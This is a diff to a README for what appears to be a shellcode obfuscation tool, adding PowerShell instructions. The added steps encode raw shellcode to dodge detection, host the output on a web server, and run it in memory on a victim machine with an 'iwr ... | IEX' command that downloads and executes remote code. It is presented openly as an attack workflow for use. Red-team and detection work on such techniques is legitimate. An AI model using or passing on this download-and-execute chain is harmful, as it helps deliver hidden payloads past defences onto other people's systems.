@@ -36,5 +36,12 @@ You can do the exact opposite in C# to get your shellcode.
     > Create a new C++ Console project in Visual Studio<br />
     > Copy and paste the generated_code.cs content and build your project<br />
 
+# For Powershell :
+    > Generate your RAW shellcode file<br />
+    > Use the encoder to obfuscate it : python.exe .\encode_psh.py .\payload.bin<br />
+    > Put your generated_code.ps1 into a web server folder<br />
+    > Open a Powershell windows on the client side and make an in-memory execution :<br />
+        iwr http://yourwebserveripaddress/generated_code.ps1 | IEX<br />
+
 
 <br /><br /><br />
